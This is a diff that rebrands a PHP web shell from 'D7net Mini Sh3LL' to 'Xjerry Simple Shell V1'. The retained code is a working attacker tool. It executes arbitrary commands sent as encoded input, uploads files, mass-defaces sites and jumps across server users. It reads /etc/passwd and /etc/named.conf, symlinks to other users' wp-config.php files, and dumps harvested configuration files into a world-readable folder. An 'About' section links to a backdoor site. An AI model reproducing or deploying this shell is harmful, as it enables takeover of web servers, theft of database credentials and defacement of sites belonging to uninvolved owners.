@@ -6,8 +6,8 @@ set_time_limit(0);
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Eror Page</title>
-    <meta name="author" content="D7net">
+    <title>Xjerry Page Shell</title>
+    <meta name="author" content="Xjerry">
     <meta name="viewport" content="Kontol" />
     <meta name="description" content="Error Page">
     <meta property="og:description" content="Error Page">
@@ -16,13 +16,13 @@ set_time_limit(0);
     <meta name="googlebot" content="noindex">
 </head>
 <link href="" rel="stylesheet" type="text/css">
-<body bgcolor="#092756" text="#ffffff">
+<body background="https://pub-071ea67114a54cc3a1d68875afee380f.r2.dev/xjjerry.jpg" >
 <style>
     @import url('https://fonts.googleapis.com/css?family=Dosis');
     @import url('https://fonts.googleapis.com/css?family=Bungee');
 body {
     font-family: "Dosis", cursive;
-    text-shadow:0px 0px 1px #757575;
+    text-shadow:0px 0px 1px #00FF7F;
 }
 
 body::-webkit-scrollbar {
@@ -39,21 +39,21 @@ body::-webkit-scrollbar-thumb {
 }
 
 #content tr:hover {
-    background-color: #8084EC;
-    text-shadow:0px 0px 10px #fff;
+    background-color: #fff;
+    text-shadow:0px 0px 10px #00FF7F;
 }
 
 #content .first {
-    background-color: #4C53F0;
+    background-color: #DEB887;
 }
 
 #content .first:hover {
-    background-color: #8084EC;
+    background-color: #fff;
     text-shadow:0px 0px 1px #757575;
 }
 
 table {
-    border: 2px #4C53F0 dotted;
+    border: 2px #DEB887 dotted;
     table-layout: fixed;
     word-break: break-all;
 }
@@ -100,7 +100,7 @@ textarea::-webkit-scrollbar {
 }
 
 textarea::-webkit-scrollbar-track {
-  background: #000000;
+  background: #00FF7F;
 }
 
 textarea::-webkit-scrollbar-thumb {
@@ -119,14 +119,14 @@ a:hover {
 }
 
 input,select,textarea {
-    border: 1px #000000 solid;
+    border: 1px #00FF7F solid;
     -moz-border-radius: 5px;
     -webkit-border-radius:5px;
     border-radius:5px;
 }
 
 .gas {
-    background-color: #4C53F0;
+    background-color: #DEB887;
     color: #ffffff;
     cursor: pointer;
 }
@@ -179,6 +179,25 @@ body, a, a:link{cursor:url(http://4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAA
 	wait;
 }
 
+
+        .blinking-text {
+            font-family: 'Bungee', sans-serif;
+            font-size: 30px;
+    animation: blinking-text 1s linear infinite;
+}
+
+@keyframes blinking-text {
+    0% {
+        color: cyan;
+    }
+    50% {
+        color: yellow;
+    }
+    100% {
+        color: cyan;
+    }
+} 
+
 </style>
 <script>
 function setfilename(val)
@@ -194,7 +213,8 @@ async function loadFile(file) {
 }
 </script>
 <center>
-<font face="Bungee" size="5">D7net Mini Sh3LL v1</font></center><br>&nbsp;
+        <div class="blinking-text">Xjerry Simple Shell V1</div>
+    </center><br>&nbsp;
 <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">	
 <tr><td>
 <?php
@@ -210,7 +230,7 @@ if (empty($disfunc)) {
 }
 
 function author() {
-    echo "<center><br>AnonSec - 2021 | Recode By D7net</center>";
+    echo "<center><br>AnonSec - 2021 | Recode By Xjerry</center>";
     exit();
 }
 
@@ -449,15 +469,15 @@ if (isset($_POST['upwkwk'])) {
 echo "</table><br>";
 echo '<table width="100%" border="0" cellpadding="5" cellspacing="5" align="center">';
 echo '<th> &nbsp;<a class="button" href="'.$_SERVER['SCRIPT_NAME'].'">Home</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&komend=d7net">&#9741; Command</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&upload=d7net">&#9741; Upload File</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&info=d7net">&#9741;Info Server</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&buatfile=d7net">&#9741; Buat File</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&mass=d7net">&#9741; Mass deface</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&jump=d7net">&#9741; Jumping</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&config=d7net">&#9741; Config</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&symlink=d7net">&#9741; Symlink</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&about=d7net">&#9741; About</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&komend=xjerry">&#9741; Command</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&upload=xjerry">&#9741; Upload File</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&info=xjerry">&#9741;Info Server</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&buatfile=xjerry">&#9741; Buat File</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&mass=xjerry">&#9741; Mass deface</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&jump=xjerry">&#9741; Jumping</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&config=xjerry">&#9741; Config</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&symlink=xjerry">&#9741; Symlink</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&about=xjerry">&#9741; About</a>&nbsp; </th>';
 echo "</table><br>";
 
 if (isset($_GET['fileloc'])) {
@@ -522,7 +542,7 @@ if (isset($_GET['fileloc'])) {
     dunlut($_POST['path']);
 } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "unzip") {
     unzip($_POST['path'], $lokasi);
-} elseif ($_REQUEST['upload'] == "d7net") {
+} elseif ($_REQUEST['upload'] == "xjerry") {
     echo "<center>Upload File : ";
     echo '<form enctype="multipart/form-data" method="post">
 <input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
@@ -536,7 +556,7 @@ if (isset($_GET['fileloc'])) {
 <textarea style="display: none" id="bepasdata" name="bepasdata"></textarea>
 <input type="submit" name="bepas" value="Upload" class="up" style="cursor: pointer; border-color: #fff">
 </form><br><br></center>';
-} elseif ($_GET['komend'] == "d7net") {
+} elseif ($_GET['komend'] == "xjerry") {
     echo "<center>";
     echo '<form method="post" onsubmit="document.getElementById(\'komendnya\').value = btoa(btoa(btoa(document.getElementById(\'komendnya\').value)))">
     '.@get_current_user().'@'.ipserv().':~ $ <input type="text" name="komend" id="komendnya" style="background-color: #1f1f1f; color: #fff">
@@ -547,16 +567,16 @@ if (isset($_GET['fileloc'])) {
     }
     echo "</center>";
 
-} elseif ($_REQUEST['symlink'] == "d7net") {
+} elseif ($_REQUEST['symlink'] == "xjerry") {
 	if (!is_file('named.txt')) {
         $d00m = @file('/etc/named.conf');
     } else {
         $d00m = @file('named.txt');
     }
     if (!$d00m) {
-        die("<hr><br><center><a class='button' href='?path=$lokasi&symread=d7net'>Bypass Read</a> <a class='button' href='?path=$lokasi&sym_404=d7net'>Symlink 404</a> <a class='button' href='?path=$lokasi&sym_bypas=d7net'>Symlink Bypass</a><br><br/><font color='red'>Can't read   /etc/named.conf</font><br/><br/></center><br>");
+        die("<hr><br><center><a class='button' href='?path=$lokasi&symread=xjerry'>Bypass Read</a> <a class='button' href='?path=$lokasi&sym_404=xjerry'>Symlink 404</a> <a class='button' href='?path=$lokasi&sym_bypas=xjerry'>Symlink Bypass</a><br><br/><font color='red'>Can't read   /etc/named.conf</font><br/><br/></center><br>");
     } else {
-        echo "[ <a href='?path=$dir&symread=d7net'>Bypass Read</a> ] [ <a href='?path=$lokasi&sym_404=d7net'>Symlink 404</a> ] [ <a href='?path=$lokasi&sym_bypas=d7net'>Symlink Bypass</a> ]<div class='tmp'>
+        echo "[ <a href='?path=$dir&symread=xjerry'>Bypass Read</a> ] [ <a href='?path=$lokasi&sym_404=xjerry'>Symlink 404</a> ] [ <a href='?path=$lokasi&sym_bypas=xjerry'>Symlink Bypass</a> ]<div class='tmp'>
                 <table align='center' width='100%'>
                     <thead class='bg-info'>
                         <th>Domains</th>
@@ -601,9 +621,9 @@ if (isset($_GET['fileloc'])) {
     exit;
 }
 
-if ($_GET['symread'] == 'd7net') {
+if ($_GET['symread'] == 'xjerry') {
     echo '<center>read /etc/named.conf';
-    echo "<form method='post' action='?path=$dir&symread=d7net&save=1'>
+    echo "<form method='post' action='?path=$dir&symread=xjerry&save=1'>
             <textarea class='form-control' rows='15' cols='50' name='file'>";
     flush();
     flush();
@@ -637,7 +657,7 @@ if ($_GET['symread'] == 'd7net') {
     exit;
 }
 
-if ($_GET['sym_404'] == 'd7net') {
+if ($_GET['sym_404'] == 'xjerry') {
     echo '<center><h2>Symlink 404</h2>
         <form method="post">
             File Target: <input type="text" class="form-control" name="dir" style="width: 250px;height: 20px;" value="/home/public_html/wp-config.php"><br><br>
@@ -645,20 +665,20 @@ if ($_GET['sym_404'] == 'd7net') {
             <input type="submit" class="button" value="Execute" name="execute"/>
         </form></center>';
     if ($_POST['execute']) {
-        rmdir('d7net_sym404');
-        mkdir('d7net_sym404', 0777);
+        rmdir('xjerry_sym404');
+        mkdir('xjerry_sym404', 0777);
         $dir = $_POST['dir'];
         $isi = $_POST['isi'];
-        system('ln -s '.$dir.'d7net_sym404/'.$isi);
-        symlink($dir, 'd7net_sym404/'.$isi);
-        $inija = fopen('d7net_sym404/.htaccess', 'w');
+        system('ln -s '.$dir.'xjerry_sym404/'.$isi);
+        symlink($dir, 'xjerry_sym404/'.$isi);
+        $inija = fopen('xjerry_sym404/.htaccess', 'w');
         fwrite($inija, 'ReadmeName '.$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any");
-        echo'<a href="/d7net_sym404/" target="_blank"> >>Sukses<< </a>';
+        echo'<a href="/xjerry_sym404/" target="_blank"> >>Sukses<< </a>';
     }
     exit;
 }
 
-if ($_GET['sym_bypas'] == 'd7net') {
+if ($_GET['sym_bypas'] == 'xjerry') {
     if (isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0) {
         $cont = stripcslashes($_POST['file']);
         if (!file_exists('passwd.txt')) {
@@ -696,7 +716,7 @@ if ($_GET['sym_bypas'] == 'd7net') {
     }
 
     echo '<center>read /etc/passwd';
-    echo "<br/><form method='post' action='?path=$lokasi&sym_bypas=d7net&save=1'>
+    echo "<br/><form method='post' action='?path=$lokasi&sym_bypas=xjerry&save=1'>
             <textarea class='form-control' rows='15' cols='50' name='file'>";
     flush();
     $file = '/etc/passwd';
@@ -726,11 +746,11 @@ if ($_GET['sym_bypas'] == 'd7net') {
     flush();
     exit;
 
-} elseif ($_REQUEST['config'] == "d7net") {
+} elseif ($_REQUEST['config'] == "xjerry") {
 	$etc = fopen('/etc/passwd', 'r') or die("<center><pre><font color=red>Can't read /etc/passwd</font></pre></center>");
-    $con = mkdir('d7net_config', 0777);
+    $con = mkdir('xjerry_config', 0777);
     $isi_htc = "Options all\nRequire None\nSatisfy Any";
-    $htc = fopen('d7net_config/.htaccess', 'w');
+    $htc = fopen('xjerry_config/.htaccess', 'w');
     fwrite($htc, $isi_htc);
     while ($passwd = fgets($etc)) {
         if ($passwd == '' || !$etc) {
@@ -935,7 +955,7 @@ if ($_GET['sym_bypas'] == 'd7net') {
                         $ambil_config = file_get_contents($config);
                         if ($ambil_config == '') {
                         } else {
-                            $file_config = fopen("d7net_config/$user_con-$nama_config.txt", 'w');
+                            $file_config = fopen("xjerry_config/$user_con-$nama_config.txt", 'w');
                             fwrite($file_config, $ambil_config);
                         }
                     }
@@ -943,10 +963,10 @@ if ($_GET['sym_bypas'] == 'd7net') {
             }
         }
     }
-    echo "<center><a href='?path=$lokasi/d7net_config'><font color=lime>Done</font></a></center>";
+    echo "<center><a href='?path=$lokasi/xjerry_config'><font color=lime>Done</font></a></center>";
     exit;
 
-} elseif ($_REQUEST['mass'] == "d7net") {
+} elseif ($_REQUEST['mass'] == "xjerry") {
 	function sabun_massal($dir,$namafile,$isi_script) {
 		if(is_writable($dir)) {
 			$dira = scandir($dir);
@@ -1015,7 +1035,7 @@ if ($_GET['sym_bypas'] == 'd7net') {
 	</form></center><br>";
 }
 exit;
-} elseif($_GET['jump'] == 'd7net') {
+} elseif($_GET['jump'] == 'xjerry') {
 	$i = 0;
 	echo "<center>Jumping server<center><br>	<div class='margin: 5px auto;'>";
 	if(preg_match("/hsphere/", $dir)) {
@@ -1142,14 +1162,14 @@ exit;
 	}
 	
 	echo "</div>";}
-	elseif ($_REQUEST['about'] == "d7net") {
+	elseif ($_REQUEST['about'] == "xjerry") {
 		echo "<hr><center>About ME<br><br>";
 		echo "Recode Shell Dari idx Anonsec dan sedikit merubah tampilan<br>";
 		echo "Tanpa adanya logger, shell ini aman digunakan<br>";
 		echo "Tunggu shell versi terbarunya dari saya ";
 		echo "kunjungi website => <a class='button' href='http://www.opetmv.rf.gd/index.php?opet=backdoor' target='_blank'>Click</a></center><hr><br>";}
 
-	elseif ($_REQUEST['buatfile'] == "d7net") {
+	elseif ($_REQUEST['buatfile'] == "xjerry") {
 		echo "<center>
     <form method='POST'>
         <input type='text' class='form-control' value='$lokasi/filekamu.php' style='width: 400px;' name='nama_file' autocomplete='off' placeholder='Nama File...'><br><br/>
@@ -1169,7 +1189,7 @@ exit;
         }
     }
 }
-elseif ($_REQUEST['info'] == "d7net") {
+elseif ($_REQUEST['info'] == "xjerry") {
 	echo "<br><hr>";
 	echo "Server IP : <font color=gold>".ipserv()."</font> &nbsp;/&nbsp; Your IP : <font color=gold>".$_SERVER['REMOTE_ADDR']."</font><br>";
 	echo "Web Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
